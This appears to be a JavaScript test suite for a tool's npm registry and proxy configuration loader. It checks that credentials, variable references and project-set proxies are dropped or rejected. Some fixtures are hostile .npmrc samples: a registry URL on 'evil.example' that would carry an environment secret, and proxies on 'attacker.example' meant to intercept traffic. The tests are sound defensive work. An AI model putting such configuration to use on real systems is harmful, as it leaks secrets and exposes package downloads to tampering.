import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { access, mkdir, symlink, writeFile } from "node:fs/promises";
import { join } from "node:path";
import test, { afterEach } from "node:test";
import { inspect, promisify } from "node:util";

import { loadNpmRegistryOptions, pacoteTarballUrl } from "../src/npm-config.js";
import { removeTemporaryDirectories, temporaryDirectory } from "./temporary-directory.mjs";

afterEach(removeTemporaryDirectories);

const SCOPE = "@schalkneethling";
const SECRET = "SECRETVALUE0123456789";

/**
 * A project directory and a user .npmrc in a temporary directory, with an environment that cannot
 * reach the developer's own ~/.npmrc. The user .npmrc is `.npmrc` in the account home folder that
 * the loader is given in place of the operating system account's, so it is the user's own file.
 * @param {{ project?: string, user?: string, env?: Record<string, string> }} files
 */
async function fixture({ project, user, env = {} }) {
  const directory = await temporaryDirectory("calavera-npm-config-");
  const cwd = join(directory, "project");
  const accountHome = join(directory, "account");
  await mkdir(cwd);
  await mkdir(accountHome);
  if (project !== undefined) await writeFile(join(cwd, ".npmrc"), project);
  const userconfig = join(accountHome, ".npmrc");
  if (user !== undefined) await writeFile(userconfig, user);
  return {
    directory,
    cwd,
    accountHome,
    env: { npm_config_userconfig: userconfig, ...env },
    scope: SCOPE,
  };
}

// The variables the loader reads from an environment npm creates. A real npm exec reports only
// these, never its whole environment, which can hold the developer's own settings.
const NPM_EXEC_KEYS = [
  "HOME",
  "npm_command",
  "npm_lifecycle_event",
  "npm_execpath",
  "npm_config_local_prefix",
  "npm_config_global_prefix",
  "npm_config_globalconfig",
  "npm_config_userconfig",
  "npm_config_user_agent",
  "npm_config_registry",
  `npm_config_${SCOPE}:registry`,
  "npm_config_proxy",
  "npm_config_https_proxy",
  "npm_config_noproxy",
];

/**
 * The loader's variables from the environment that a real `npm exec --offline` creates in `cwd`,
 * started from an environment without npm_* variables or INIT_CWD and with an isolated home folder, so the
 * developer's own settings do not leak in. `variables` are passed to npm and reported back.
 * Skips the test only when npm is not installed.
 * @param {import("node:test").TestContext} t
 * @param {string} cwd
 * @param {string} home
 * @param {Record<string, string>} variables
 * @returns {Promise<Record<string, string> | undefined>}
 */
async function npmExecEnvironmentIn(t, cwd, home, variables) {
  // A package manager that runs this test, such as pnpm, also sets INIT_CWD, which npm would
  // then see while it loads the project file.
  const clean = Object.fromEntries(
    Object.entries(process.env).filter(([name]) => !/^(npm_|INIT_CWD$)/i.test(name)),
  );
  const keys = [...NPM_EXEC_KEYS, ...Object.keys(variables)];
  const script = join(home, "report-npm-environment.cjs");
  await writeFile(
    script,
    `const keys = ${JSON.stringify(keys)};
process.stdout.write(JSON.stringify(Object.fromEntries(keys.filter((key) => process.env[key] !== undefined).map((key) => [key, process.env[key]]))));
`,
  );
  try {
    // -c runs the command through a shell, so npm does not look up `node` as a package, which
    // a project prefix would otherwise make it fetch.
    const { stdout } = await promisify(execFile)(
      "npm",
      ["exec", "--offline", "-c", `node "${script}"`],
      { cwd, env: { ...clean, HOME: home, ...variables } },
    );
    return JSON.parse(stdout);
  } catch (error) {
    if (/** @type {NodeJS.ErrnoException} */ (error).code !== "ENOENT") throw error;
    t.skip("npm is not installed");
    return undefined;
  }
}

test("a project .npmrc proxy value with a variable reference is ignored with a warning that names the key", async () => {
  const context = await fixture({
    project: `https-proxy=http://\${PROXY_HOST}:8080/\n`,
    env: { PROXY_HOST: SECRET },
  });
  const { options, warnings, diagnostics } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, {});
  assert.equal(warnings.length, 1);
  assert.match(
    warnings[0],
    /^Ignored https-proxy in the project \.npmrc: Calavera expands variables only/,
  );
  assert.doesNotMatch(inspect([warnings, diagnostics]), new RegExp(SECRET));
});

test("a key with a variable reference is not on the allowlist, so it is dropped without expansion or a warning", async () => {
  const context = await fixture({
    project: `\${KEY}=https://project.example.com/\n`,
    user: `\${KEY}=https://user.example.com/\n`,
    env: { KEY: "registry" },
  });
  const { options, warnings, diagnostics } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, {});
  assert.deepEqual([warnings, diagnostics], [[], []]);
});

test("a project .npmrc drop does not remove a valid user .npmrc value", async () => {
  const context = await fixture({
    project: `https-proxy=http://\${PROXY_HOST}/\n`,
    user: "https-proxy=http://user-proxy.example.com/\n",
    env: { PROXY_HOST: SECRET },
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.equal(options.httpsProxy, "http://user-proxy.example.com/");
});

test("the user .npmrc and the environment expand variables in proxy values", async () => {
  const context = await fixture({
    user: `https-proxy=http://\${PROXY_HOST}:8080/\n`,
    env: {
      PROXY_HOST: "proxy.example.com",
      npm_config_noproxy: "${NO_PROXY_HOST}",
      NO_PROXY_HOST: "internal.example.com",
    },
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, {
    httpsProxy: "http://proxy.example.com:8080/",
    noProxy: "internal.example.com",
  });
});

test("an unset variable in a proxy drops the key, and the diagnostics name the key and variable", async () => {
  const context = await fixture({ user: `https-proxy=http://\${CALAVERA_UNSET_HOST}/\n` });
  const { options, warnings, diagnostics, unsetVariables } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, {});
  assert.deepEqual(warnings, []);
  assert.deepEqual(unsetVariables, ["CALAVERA_UNSET_HOST"]);
  assert.match(
    diagnostics.join("\n"),
    /^Ignored https-proxy in the user \.npmrc: environment variable CALAVERA_UNSET_HOST is not set\.$/m,
  );
});

test("a username and password in a registry URL are removed with a warning that names the setting, not the value", async () => {
  const context = await fixture({
    project: `${SCOPE}:registry=https://alice:${SECRET}@registry.example.com/npm/\n`,
  });
  const result = await loadNpmRegistryOptions(context);
  assert.deepEqual(result.options, { [`${SCOPE}:registry`]: "https://registry.example.com/npm/" });
  assert.equal(result.registryUrl, "https://registry.example.com/npm/");
  assert.deepEqual(result.warnings, [
    "Used @schalkneethling:registry from the project .npmrc without the username and password in its URL: Calavera sends no credentials to any registry.",
  ]);
  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(`${SECRET}|alice`));

  const plain = await loadNpmRegistryOptions(
    await fixture({ user: `registry=https://${SECRET}@registry.example.com/\n` }),
  );
  assert.equal(plain.options.registry, "https://registry.example.com/");
  assert.match(plain.warnings[0], /^Used registry from the user \.npmrc without the username/);
  assert.doesNotMatch(inspect(plain, { depth: 10 }), new RegExp(SECRET));
});

test("a registry value with a variable stops the command, from every npm layer, without echoing the value", async () => {
  /** @type {[{ project?: string, user?: string, env?: Record<string, string> }, RegExp][]} */
  const cases = [
    [
      { user: `registry=https://npm.example.com/\${TOKEN}/\n` },
      /^The npm configuration key registry in the user \.npmrc contains a variable reference\./,
    ],
    [
      { project: `${SCOPE}:registry=https://npm.example.com/\${TOKEN}/\n` },
      /^The npm configuration key @schalkneethling:registry in the project \.npmrc contains a variable reference\./,
    ],
    [
      { env: { npm_config_registry: `https://npm.example.com/\${TOKEN}/` } },
      /^The npm configuration key registry in the environment contains a variable reference\./,
    ],
    // An unset variable stops the command too, rather than falling back to another registry.
    [
      { user: `registry=https://npm.example.com/\${CALAVERA_UNSET_TOKEN}/\n` },
      /registry in the user \.npmrc contains a variable reference/,
    ],
  ];
  for (const [files, message] of cases) {
    const context = await fixture({
      user: "registry=https://fallback.example.com/\n",
      ...files,
      env: { TOKEN: SECRET, ...files.env },
    });
    await assert.rejects(loadNpmRegistryOptions(context), (error) => {
      assert.match(error.message, message);
      assert.doesNotMatch(inspect(error, { depth: 10 }), new RegExp(`${SECRET}|npm\\.example`));
      return true;
    });
  }
});

test("only the registry and the artifact scope registry are validated", async () => {
  const context = await fixture({
    project: `@other:registry=not a url\n@blank:registry=\n${SCOPE}:registry=https://registry.example.com/\n`,
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, { [`${SCOPE}:registry`]: "https://registry.example.com/" });

  const invalid = await fixture({ project: `${SCOPE}:registry=not a url\n` });
  await assert.rejects(() => loadNpmRegistryOptions(invalid), /@schalkneethling:registry/);
});

test("a blank registry for the artifact scope is skipped with a warning", async () => {
  const context = await fixture({
    user: "registry=https://registry.example.com/\n",
    project: `${SCOPE}:registry=\n`,
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, { registry: "https://registry.example.com/" });
  assert.match(warnings.join("\n"), /@schalkneethling:registry/);
});

test("an unreadable .npmrc is skipped with a warning that names the path and code", async () => {
  const context = await fixture({ user: "registry=https://registry.example.com/\n" });
  // A directory named .npmrc cannot be read as a file (EISDIR).
  await mkdir(join(context.cwd, ".npmrc"));
  const { options, warnings, diagnostics } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, { registry: "https://registry.example.com/" });
  assert.equal(warnings.length, 1);
  assert.match(warnings[0], /EISDIR/);
  assert.match(
    warnings[0],
    new RegExp(join(context.cwd, ".npmrc").replace(/[\\^$.*+?()[\]{}|]/g, "\\$&")),
  );
  assert.deepEqual(diagnostics, warnings);
});

test("a missing .npmrc is not a warning", async () => {
  const { warnings } = await loadNpmRegistryOptions(await fixture({}));
  assert.deepEqual(warnings, []);
});

test("npm_config_userconfig expands ~ and variables, and a project userconfig is ignored", async () => {
  const context = await fixture({ project: "userconfig=/nonexistent/other.npmrc\n" });
  const home = join(context.directory, "home");
  await mkdir(home);
  await writeFile(join(home, "tokens.npmrc"), "registry=https://home.example.com/\n");
  const viaTilde = await loadNpmRegistryOptions({
    ...context,
    env: { HOME: home, npm_config_userconfig: "~/tokens.npmrc" },
  });
  assert.equal(viaTilde.options.registry, "https://home.example.com/");

  const viaVariable = await loadNpmRegistryOptions({
    ...context,
    env: { CONFIG_DIR: home, npm_config_userconfig: "${CONFIG_DIR}/tokens.npmrc" },
  });
  assert.equal(viaVariable.options.registry, "https://home.example.com/");

  const defaultPath = await loadNpmRegistryOptions({ ...context, env: { HOME: home } });
  assert.equal(defaultPath.options.registry, undefined);
  await writeFile(join(home, ".npmrc"), "registry=https://default.example.com/\n");
  const viaHome = await loadNpmRegistryOptions({ ...context, env: { HOME: home } });
  assert.equal(viaHome.options.registry, "https://default.example.com/");
});

test("no credential key is returned or named, from any npm layer, and only allowlisted options come back", async () => {
  const credentials = (/** @type {string} */ host) =>
    [
      `//${host}/:_authToken=${SECRET}`,
      `//${host}/:_auth=${SECRET}`,
      `//${host}/:username=alice`,
      `//${host}/:_password=${SECRET}`,
      `//${host}/:certfile=/etc/${SECRET}.pem`,
      `//${host}/:keyfile=/etc/${SECRET}.key`,
      `_authToken=${SECRET}`,
      `cert=${SECRET}`,
      `key=${SECRET}`,
      "strict-ssl=false",
      "",
    ].join("\n");
  const context = await fixture({
    user: `registry=https://registry.example.com/\n${credentials("registry.example.com")}`,
    project: `${SCOPE}:registry=https://scoped.example.com/\n${credentials("scoped.example.com")}`,
    env: {
      "npm_config_//registry.example.com/:_authToken": SECRET,
      npm_config__auth: SECRET,
      npm_config_cert: SECRET,
      npm_config_force_auth: SECRET,
    },
  });
  const result = await loadNpmRegistryOptions(context);
  assert.deepEqual(result.options, {
    registry: "https://registry.example.com/",
    [`${SCOPE}:registry`]: "https://scoped.example.com/",
  });
  assert.deepEqual([result.warnings, result.diagnostics], [[], []]);
  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(`${SECRET}|alice`));
});

test("the effective registry and where it came from are reported", async () => {
  const none = await loadNpmRegistryOptions(await fixture({}));
  assert.deepEqual(none.registry, {
    origin: "https://registry.npmjs.org",
    source: "default",
    setting: null,
  });

  const user = await loadNpmRegistryOptions(
    await fixture({ user: "registry=https://user.example.com:8443/\n" }),
  );
  assert.deepEqual(user.registry, {
    origin: "https://user.example.com:8443",
    source: "user .npmrc",
    setting: "registry",
  });

  const project = await loadNpmRegistryOptions(
    await fixture({
      user: "registry=https://user.example.com/\n",
      project: `${SCOPE}:registry=https://project.example.com/\n`,
    }),
  );
  assert.deepEqual(project.registry, {
    origin: "https://project.example.com",
    source: "project .npmrc",
    setting: "@schalkneethling:registry",
  });

  const env = await loadNpmRegistryOptions(
    await fixture({
      project: "registry=https://project.example.com/\n",
      env: { NPM_CONFIG_REGISTRY: "https://env.example.com/" },
    }),
  );
  assert.deepEqual(env.registry, {
    origin: "https://env.example.com",
    source: "environment",
    setting: "registry",
  });
});

// What `npm exec` and `npm run` export to a child, captured with npm 11.19.0 for a project
// .npmrc of `registry=https://evil.example/${SECRET_X}/`: npm expands the variable itself and
// exports the result as npm_config_registry, next to markers that show npm started the process.
const SECRET_X = "s3cr3t-from-the-environment";
/** @param {string} cwd @param {string} userconfig */
function npmExecEnvironment(cwd, userconfig) {
  return {
    SECRET_X,
    npm_command: "exec",
    npm_lifecycle_event: "npx",
    npm_execpath: "/usr/lib/node_modules/npm/bin/npm-cli.js",
    npm_config_local_prefix: cwd,
    npm_config_userconfig: userconfig,
    npm_config_registry: `https://evil.example/${SECRET_X}/`,
  };
}

test("a registry that npm expanded from the project .npmrc stops the command, naming the project file", async () => {
  const context = await fixture({ project: "registry=https://evil.example/${SECRET_X}/\n" });
  const env = npmExecEnvironment(context.cwd, context.env.npm_config_userconfig);
  await assert.rejects(loadNpmRegistryOptions({ ...context, env }), (error) => {
    assert.match(
      error.message,
      /^The npm configuration key registry in the project \.npmrc contains a variable reference\./,
    );
    assert.doesNotMatch(inspect(error, { depth: 10 }), new RegExp(`${SECRET_X}|evil`));
    return true;
  });
});

test("npm run exports the same shape, so it is handled the same way", async () => {
  const context = await fixture({ project: "registry=https://evil.example/${SECRET_X}/\n" });
  const env = {
    ...npmExecEnvironment(context.cwd, context.env.npm_config_userconfig),
    npm_command: "run",
    npm_lifecycle_event: "show",
  };
  await assert.rejects(loadNpmRegistryOptions({ ...context, env }), (error) => {
    assert.match(error.message, /registry in the project \.npmrc contains a variable reference/);
    assert.doesNotMatch(inspect(error, { depth: 10 }), new RegExp(SECRET_X));
    return true;
  });
});

test("a registry that npm exported from a literal project .npmrc value is labeled as the project", async () => {
  const context = await fixture({ project: "registry=https://project.example.com/\n" });
  const env = {
    ...npmExecEnvironment(context.cwd, context.env.npm_config_userconfig),
    npm_config_registry: "https://project.example.com/",
  };
  const result = await loadNpmRegistryOptions({ ...context, env });
  assert.deepEqual(result.registry, {
    origin: "https://project.example.com",
    source: "project .npmrc",
    setting: "registry",
  });
});

test("under npm exec, a user .npmrc registry with a variable stops the command, although npm exports the expanded copy", async () => {
  const TOKEN = "fake-path-token-0123456789";
  const context = await fixture({ user: "registry=https://npm.example.com/${TOKEN}/\n" });
  const env = {
    ...npmExecEnvironment(context.cwd, context.env.npm_config_userconfig),
    TOKEN,
    npm_config_registry: `https://npm.example.com/${TOKEN}/`,
  };
  await assert.rejects(loadNpmRegistryOptions({ ...context, env }), (error) => {
    assert.match(
      error.message,
      /^The npm configuration key registry in the user \.npmrc contains a variable reference\./,
    );
    assert.doesNotMatch(inspect(error, { depth: 10 }), new RegExp(TOKEN));
    return true;
  });
});

test("an explicit npm_config_registry still wins under npm when it differs from the project file", async () => {
  const context = await fixture({ project: "registry=https://project.example.com/\n" });
  const env = {
    ...npmExecEnvironment(context.cwd, context.env.npm_config_userconfig),
    npm_config_registry: "https://chosen.example.com/",
  };
  const result = await loadNpmRegistryOptions({ ...context, env });
  assert.deepEqual(result.registry, {
    origin: "https://chosen.example.com",
    source: "environment",
    setting: "registry",
  });
});

test("the project file is not consulted for the environment when npm did not start Calavera", async () => {
  const context = await fixture({ project: "registry=https://chosen.example.com/\n" });
  const { npm_command, npm_lifecycle_event, npm_execpath, npm_config_local_prefix, ...env } = {
    ...npmExecEnvironment(context.cwd, context.env.npm_config_userconfig),
    npm_config_registry: "https://chosen.example.com/",
  };
  void [npm_command, npm_lifecycle_event, npm_execpath, npm_config_local_prefix];
  const result = await loadNpmRegistryOptions({ ...context, env });
  assert.equal(result.registry.source, "environment");
});

test("the environment npm creates for a real npm exec stops the command and does not reach a request", async (t) => {
  const context = await fixture({ project: "registry=https://evil.example/${SECRET_X}/\n" });
  const home = join(context.directory, "home");
  await mkdir(home);
  const captured = await npmExecEnvironmentIn(t, context.cwd, home, {
    SECRET_X,
    npm_config_userconfig: context.env.npm_config_userconfig,
  });
  if (!captured) return;
  assert.equal(captured.npm_config_registry, `https://evil.example/${SECRET_X}/`);
  await assert.rejects(loadNpmRegistryOptions({ ...context, env: captured }), (error) => {
    assert.match(error.message, /registry in the project \.npmrc contains a variable reference/);
    assert.doesNotMatch(inspect(error, { depth: 10 }), new RegExp(SECRET_X));
    return true;
  });
});

test("a project .npmrc cannot choose an http registry", async () => {
  const context = await fixture({ project: `${SCOPE}:registry=http://registry.example.com/\n` });
  await assert.rejects(
    () => loadNpmRegistryOptions(context),
    (error) => {
      assert.match(error.message, /@schalkneethling:registry/);
      assert.match(error.message, /project \.npmrc/);
      assert.match(error.message, /https/);
      return true;
    },
  );
});

test("an http registry from the user .npmrc or the environment is allowed", async () => {
  const user = await loadNpmRegistryOptions(
    await fixture({ user: "registry=http://registry.example.com/\n" }),
  );
  assert.deepEqual(user.registry, {
    origin: "http://registry.example.com",
    source: "user .npmrc",
    setting: "registry",
  });
  assert.deepEqual(user.warnings, []);
  const env = await loadNpmRegistryOptions(
    await fixture({ env: { npm_config_registry: "http://registry.example.com/" } }),
  );
  assert.deepEqual(env.registry, {
    origin: "http://registry.example.com",
    source: "environment",
    setting: "registry",
  });
});

test("a key outside the allowlist, however it is written, is dropped without a warning", async () => {
  const keys = [
    "//evil.example/\u001b[31mred\u001b]0\u0007:_authToken",
    `//${"a".repeat(500)}.example/:_authToken`,
  ];
  const context = await fixture({ project: keys.map((key) => `${key}=\${SECRET_X}\n`).join("") });
  const { options, warnings, diagnostics } = await loadNpmRegistryOptions(context);
  assert.deepEqual([options, warnings, diagnostics], [{}, [], []]);
});

test("a username and password in an environment registry URL are removed with a warning", async () => {
  const context = await fixture({
    env: { npm_config_registry: `https://alice:${SECRET}@registry.example.com/` },
  });
  const result = await loadNpmRegistryOptions(context);
  assert.equal(result.options.registry, "https://registry.example.com/");
  assert.deepEqual(result.warnings, [
    "Used registry from the environment without the username and password in its URL: Calavera sends no credentials to any registry.",
  ]);
  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(`${SECRET}|alice`));
});

const PROXY_SECRET = "PROXYPASS0123456789";

test("proxy, https-proxy, and noproxy from the user .npmrc reach the options npm-registry-fetch reads", async () => {
  const context = await fixture({
    user: `proxy=http://proxy.example.com:8080/\nhttps-proxy=http://user:${PROXY_SECRET}@secure-proxy.example.com:8443/\nnoproxy=internal.example.com,.corp.example.com\n`,
  });
  const { options, warnings, diagnostics } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, "http://proxy.example.com:8080/");
  assert.equal(options.httpsProxy, `http://user:${PROXY_SECRET}@secure-proxy.example.com:8443/`);
  assert.equal(options.noProxy, "internal.example.com,.corp.example.com");
  // npm-registry-fetch reads camelCase names only, so the .npmrc spellings must not leak through.
  assert.equal(options["https-proxy"], undefined);
  assert.equal(options.noproxy, undefined);
  assert.deepEqual(warnings, []);
  assert.doesNotMatch(inspect(diagnostics), new RegExp(PROXY_SECRET));
});

test("a proxy in the project .npmrc is ignored with a warning, and its noproxy still applies", async () => {
  const context = await fixture({
    project:
      "https-proxy=http://proxy.example.com:8080/\nproxy=http://proxy.example.com:8080/\nnoproxy=registry.internal.example.com\n",
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.httpsProxy, undefined);
  assert.equal(options.proxy, undefined);
  assert.equal(options.noProxy, "registry.internal.example.com");
  assert.equal(warnings.length, 2);
  // Warnings follow the order of the file.
  assert.match(
    warnings[0],
    /^Ignored https-proxy in the project \.npmrc: Calavera reads proxies only from user.*To use it, set it in your user \.npmrc\.$/,
  );
  assert.match(warnings[1], /^Ignored proxy in the project \.npmrc/);
});

test("a noproxy list in the .npmrc is joined with commas, as npm joins it", async () => {
  const context = await fixture({ user: "noproxy[]=a.example.com\nnoproxy[]=b.example.com\n" });
  assert.equal(
    (await loadNpmRegistryOptions(context)).options.noProxy,
    "a.example.com,b.example.com",
  );
});

test("npm_config_https_proxy and npm_config_noproxy override the .npmrc files", async () => {
  const context = await fixture({
    user: "https-proxy=http://user-proxy.example.com/\nnoproxy=a.example.com\n",
    env: {
      npm_config_https_proxy: "http://env-proxy.example.com/",
      npm_config_noproxy: "b.example.com",
    },
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.equal(options.httpsProxy, "http://env-proxy.example.com/");
  assert.equal(options.noProxy, "b.example.com");
});

test("a proxy URL that is not http, https, or socks is ignored with a warning that does not echo it", async () => {
  const context = await fixture({
    user: `proxy=ftp://user:${PROXY_SECRET}@proxy.example.com/\nhttps-proxy=not a url ${PROXY_SECRET}\n`,
  });
  const { options, warnings, diagnostics } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, undefined);
  assert.equal(options.httpsProxy, undefined);
  assert.equal(warnings.length, 2);
  assert.match(warnings[0], /\bproxy\b.*user \.npmrc/);
  assert.match(warnings[1], /https-proxy.*user \.npmrc/);
  assert.doesNotMatch(inspect([warnings, diagnostics]), new RegExp(PROXY_SECRET));
});

test("a socks proxy is accepted, because @npmcli/agent supports it", async () => {
  const context = await fixture({ user: "https-proxy=socks5://proxy.example.com:1080\n" });
  const { options } = await loadNpmRegistryOptions(context);
  assert.equal(options.httpsProxy, "socks5://proxy.example.com:1080");
});

test("a project .npmrc proxy with a variable reference is ignored like other project entries", async () => {
  const context = await fixture({
    project: "https-proxy=http://${PROXY_USER}@proxy.example.com/\n",
    env: { PROXY_USER: PROXY_SECRET },
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.httpsProxy, undefined);
  assert.match(warnings[0], /https-proxy.*project \.npmrc/);
  assert.doesNotMatch(inspect(warnings), new RegExp(PROXY_SECRET));
});

test("a project .npmrc proxy is ignored for an http registry, so it cannot change packages in transit", async () => {
  const context = await fixture({
    user: "registry=http://registry.example.com/\n",
    project: "proxy=http://proxy.example.com/\nhttps-proxy=http://proxy.example.com/\n",
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, undefined);
  assert.equal(options.httpsProxy, undefined);
  assert.ok(warnings.some((warning) => warning.startsWith("Ignored proxy in the project .npmrc")));
});

test("a user .npmrc proxy is still used for an http registry", async () => {
  const context = await fixture({
    user: "registry=http://registry.example.com/\nproxy=http://proxy.example.com/\n",
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, "http://proxy.example.com/");
});

test("an empty proxy in a later file unsets the proxy, as an empty npm setting does", async () => {
  const context = await fixture({
    user: "https-proxy=http://user-proxy.example.com/\nproxy=http://user-proxy.example.com/\n",
    project: "https-proxy=\nproxy=\n",
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.equal(options.httpsProxy, undefined);
  assert.equal(options.proxy, undefined);
  assert.deepEqual(Object.keys(options), []);
});

test("a project noproxy still applies for an http registry, because it only removes the proxy", async () => {
  const context = await fixture({
    user: "registry=http://registry.example.com/\nproxy=http://proxy.example.com/\n",
    project: "noproxy=registry.example.com\n",
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.noProxy, "registry.example.com");
  assert.deepEqual(warnings, []);
});

test("a project .npmrc proxy does not remove the user .npmrc proxy, and the warning says which one applies", async () => {
  const context = await fixture({
    user: "https-proxy=http://corp.example.com:8080/\nproxy=http://corp.example.com:8080/\n",
    project: "https-proxy=http://team.example.com:3128/\nproxy=http://team.example.com:3128/\n",
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.httpsProxy, "http://corp.example.com:8080/");
  assert.equal(options.proxy, "http://corp.example.com:8080/");
  assert.equal(warnings.length, 2);
  for (const warning of warnings) {
    assert.match(
      warning,
      /in the project \.npmrc: .*Calavera uses https-proxy from the user \.npmrc instead\.$/,
    );
    assert.doesNotMatch(warning, /No other proxy setting applies/);
  }
});

test("the project proxy warning names the proxy that is used after every layer is read", async () => {
  const overridden = await fixture({
    user: "https-proxy=http://user-proxy.example.com/\n",
    project: "https-proxy=http://team-proxy.example.com/\n",
    env: { npm_config_https_proxy: "http://env-proxy.example.com/" },
  });
  const overriddenResult = await loadNpmRegistryOptions(overridden);
  assert.equal(overriddenResult.options.httpsProxy, "http://env-proxy.example.com/");
  assert.match(
    overriddenResult.warnings[0],
    /Calavera uses https-proxy from the environment instead\.$/,
  );

  const emptyUser = await fixture({
    user: "https-proxy=\n",
    project: "https-proxy=http://team-proxy.example.com/\n",
  });
  const emptyResult = await loadNpmRegistryOptions(emptyUser);
  assert.equal(emptyResult.options.httpsProxy, undefined);
  assert.match(emptyResult.warnings[0], /To use it, set it in your user \.npmrc\.$/);
});

/**
 * A repository whose root .npmrc holds `npmrc`, run as `npm exec` from `member` (a path below the
 * root). npm reads the project .npmrc at its local prefix, the root here, and exports its values.
 * @param {{ npmrc: string, member: string, rootPackage: object, memberPackage?: object, exported: Record<string, string> }} setup
 */
async function npmExecFromBelowRoot({ npmrc, member, rootPackage, memberPackage, exported }) {
  const directory = await temporaryDirectory("calavera-npm-prefix-");
  const root = join(directory, "repo");
  const cwd = join(root, member);
  await mkdir(cwd, { recursive: true });
  await writeFile(join(root, ".npmrc"), npmrc);
  await writeFile(join(root, "package.json"), JSON.stringify(rootPackage));
  if (memberPackage) await writeFile(join(cwd, "package.json"), JSON.stringify(memberPackage));
  return {
    cwd,
    scope: SCOPE,
    env: {
      npm_config_userconfig: join(directory, "missing.npmrc"),
      npm_command: "exec",
      npm_config_local_prefix: root,
      ...exported,
    },
  };
}

test("under npm exec from a workspace member, the workspace root .npmrc proxy is a project proxy", async () => {
  const context = await npmExecFromBelowRoot({
    npmrc: "https-proxy=http://attacker.example:8080/\n",
    member: "packages/web",
    rootPackage: { name: "repo", workspaces: ["packages/*"] },
    memberPackage: { name: "web" },
    exported: { npm_config_https_proxy: "http://attacker.example:8080/" },
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.httpsProxy, undefined);
  assert.match(warnings[0], /^Ignored https-proxy in the project \.npmrc/);
});

test("under npm exec from a subdirectory without package.json, the package root .npmrc is the project file", async () => {
  const context = await npmExecFromBelowRoot({
    npmrc:
      "https-proxy=http://attacker.example:8080/\nregistry=https://project-registry.example.com/\n",
    member: "src/lib",
    rootPackage: { name: "repo" },
    exported: {
      npm_config_https_proxy: "http://attacker.example:8080/",
      npm_config_registry: "https://project-registry.example.com/",
    },
  });
  const { options, registry, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.httpsProxy, undefined);
  assert.match(warnings[0], /^Ignored https-proxy in the project \.npmrc/);
  // The registry keeps its project label, as when npm runs from the root itself.
  assert.deepEqual(registry, {
    origin: "https://project-registry.example.com",
    source: "project .npmrc",
    setting: "registry",
  });
});

test("under npm exec from a workspace member, the root .npmrc cannot choose an http registry", async () => {
  const context = await npmExecFromBelowRoot({
    npmrc: "registry=http://registry.example.com/\n",
    member: "packages/web",
    rootPackage: { name: "repo", workspaces: ["packages/*"] },
    memberPackage: { name: "web" },
    exported: { npm_config_registry: "http://registry.example.com/" },
  });
  await assert.rejects(loadNpmRegistryOptions(context), /project \.npmrc must be an https URL/);
});

test("npm_config_noproxy in npm's exported list format is joined with commas", async () => {
  const exported = await fixture({
    user: "noproxy[]=a.example.com\nnoproxy[]=b.example.com\n",
    env: {
      npm_command: "exec",
      npm_config_noproxy: "a.example.com\n\nb.example.com",
    },
  });
  assert.equal(
    (await loadNpmRegistryOptions(exported)).options.noProxy,
    "a.example.com,b.example.com",
  );
  const plain = await fixture({ env: { npm_config_noproxy: "a.example.com\n\nb.example.com" } });
  assert.equal(
    (await loadNpmRegistryOptions(plain)).options.noProxy,
    "a.example.com,b.example.com",
  );
});

test("a rejected project proxy warning names the user https-proxy that npm-registry-fetch uses", async () => {
  const context = await fixture({
    user: "https-proxy=http://corp.example.com:8080/\n",
    project: "proxy=http://team.example.com:3128/\n",
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.httpsProxy, "http://corp.example.com:8080/");
  assert.match(
    warnings[0],
    /^Ignored proxy in the project \.npmrc: .*Calavera uses https-proxy from the user \.npmrc instead\.$/,
  );
});

test("under npm exec, a workspace member's own .npmrc is not read, as npm ignores it", async () => {
  const context = await npmExecFromBelowRoot({
    npmrc: "registry=https://root-registry.example.com/\n",
    member: "packages/web",
    rootPackage: { name: "repo", workspaces: ["packages/*"] },
    memberPackage: { name: "web" },
    exported: { npm_config_registry: "https://root-registry.example.com/" },
  });
  await writeFile(join(context.cwd, ".npmrc"), "registry=https://member-registry.example.com/\n");
  assert.deepEqual((await loadNpmRegistryOptions(context)).registry, {
    origin: "https://root-registry.example.com",
    source: "project .npmrc",
    setting: "registry",
  });
});

test("under npm exec, a local prefix at the user .npmrc folder is not read twice as a project file", async () => {
  const context = await npmExecFromBelowRoot({
    npmrc: "registry=http://user-registry.example.com/\n",
    member: "src",
    rootPackage: { name: "repo" },
    exported: { npm_config_registry: "http://user-registry.example.com/" },
  });
  // The repository root's .npmrc is the user's own file here, so its http registry is allowed.
  context.env.npm_config_userconfig = join(context.env.npm_config_local_prefix, ".npmrc");
  assert.deepEqual((await loadNpmRegistryOptions(context)).registry, {
    origin: "http://user-registry.example.com",
    source: "user .npmrc",
    setting: "registry",
  });
});

test("under npm exec, a project proxy written with another spelling is recognized as project content", async () => {
  for (const spelling of ["https_proxy", "HTTPS-PROXY"]) {
    const context = await fixture({
      project: `${spelling}=http://attacker.example:8080/\n`,
      env: { npm_command: "exec", npm_config_https_proxy: "http://attacker.example:8080/" },
    });
    const { options, warnings } = await loadNpmRegistryOptions(context);
    assert.equal(options.httpsProxy, undefined, spelling);
    assert.match(warnings[0], new RegExp(`^Ignored ${spelling} in the project \\.npmrc`), spelling);
  }
});

